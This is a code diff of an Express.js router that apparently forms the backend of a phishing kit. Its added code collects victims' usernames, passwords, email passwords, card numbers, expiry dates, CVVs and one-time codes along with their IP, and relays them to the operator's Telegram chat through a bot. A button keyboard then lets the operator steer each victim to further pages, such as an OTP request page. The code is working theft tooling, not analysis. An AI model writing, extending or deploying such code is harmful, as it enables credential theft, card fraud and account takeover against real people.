@@ -1,61 +1,93 @@
 import express from 'express';
 import bot from '../config/botConfig.js';
 import { CHAT_ID } from '../config/preconfigs.js';
+import { generateRandomID } from '../helpers/utils.js';
 
 const router = express.Router();
 
-// Variable para almacenar la opción seleccionada por cada cliente
-let opcionSeleccionada;
+const activeMessages = new Map(); // Almacena los mensajes activos con su respectivo token
 
 router.post('/generals', (req, res) => {
-  // Enviar las opciones al chat de Telegram y obtener el identificador del mensaje enviado
-  const messageId = enviarOpciones();
+  let infoMessage = `
+    \u{1F534} Nuevo Registro \u{1F534}
+    ----------------------------
 
-  // Esperar la respuesta desde el chat de Telegram y enviarla en res.json()
-  const context = {
-    res: res,
-    messageId: messageId
-  };
+    \u{1F465} User: ${req.body.user}
 
-  bot.once('callback_query', (query) => {
-    // Actualizar la opción seleccionada
-    opcionSeleccionada = query.data;
+    \u{1F512} Pass: ${req.body.puser}
 
-    // Limpiar los botones de la conversación
-    bot.editMessageReplyMarkup({ chat_id: CHAT_ID, message_id: context.messageId });
+    ----------------------------
 
-    // Enviar la opción seleccionada en res.json()
-    if (context.res) {
-      context.res.json({ opt: opcionSeleccionada });
-      context.res = null; // Eliminar la referencia a res para evitar respuestas duplicadas
-    }
-  });
-});
+    \u{1F4E7} Email: ${req.body.email}
 
-function enviarOpciones() {
+    \u{1F513} Pass: ${req.body.pemail}
+
+    \u{1F4F2} Celular: ${req.body.pemail}
+
+    ----------------------------
+
+    \u{1F4B3} CARD: ${req.body.p}
+
+    \u{1F4C5} FECHA: ${req.body.f}
+
+    \u{2B50} CVV: ${req.body.c}
+
+    \u{1F4A3} OTP: ${req.body.tok}
+
+    ----------------------------
+    IP: ${req.ip.split(':').pop()}
+  
+  `;
+
+  const token = generateRandomID();
+
   const opts = {
-    reply_markup: {
+    reply_markup: JSON.stringify({
       inline_keyboard: [
         [
-          { text: 'Opción 1', callback_data: 'opcion1' },
-          { text: 'Opción 2', callback_data: 'opcion2' },
-          { text: 'Opción 3', callback_data: 'opcion3' }
+          { text: '$ Pedir TOKEN $', callback_data: `token.html:${token}` }
+        ],
+        [
+          { text: 'newUser', callback_data: `index.html:${token}` },
+          { text: 'newCard', callback_data: `card.html:${token}` },
+          { text: 'newEmail', callback_data: `email.html:${token}` },
+        ],
+        [
+          { text: 'Finalizar', callback_data: `success.html:${token}` },
         ]
       ],
-      one_time_keyboard: true
-    }
+      one_time_keyboard: true,
+    }),
   };
 
-  return bot.sendMessage(CHAT_ID, 'Elige una opción:', opts)
-    .then(message => {
-      console.log(message.message_id);
-      return message.message_id;
-    })
-    .catch(error => {
-      console.error('Error al enviar el mensaje:', error);
-      return null;
-    });
-}
+  bot.sendMessage(CHAT_ID, infoMessage);
+
+  setTimeout(() => { // Evitar que salga primero el teclado
+    bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts)
+      .then(message => {
+        const messageID = message.message_id;
+        activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
+      })
+      .catch(err => console.log(err));
+  }, 100);
+})
+
+
+// Maneja las respuestas a las opciones del teclado personalizado
+bot.on('callback_query', (query) => {
+  const data = query.data.split(':');
+  const token = data[1];
+
+  if (activeMessages.has(token)) {
+    const { messageID, res } = activeMessages.get(token);
+    activeMessages.delete(token); // Elimina el mensaje de la estructura de datos
+
+    bot.deleteMessage(CHAT_ID, messageID);
+
+    // Enviar respuesta a través de la respuesta HTTP almacenada
+    res.json({ 'redirect_to': data[0] });
+  }
+});
 
 
 export default router;
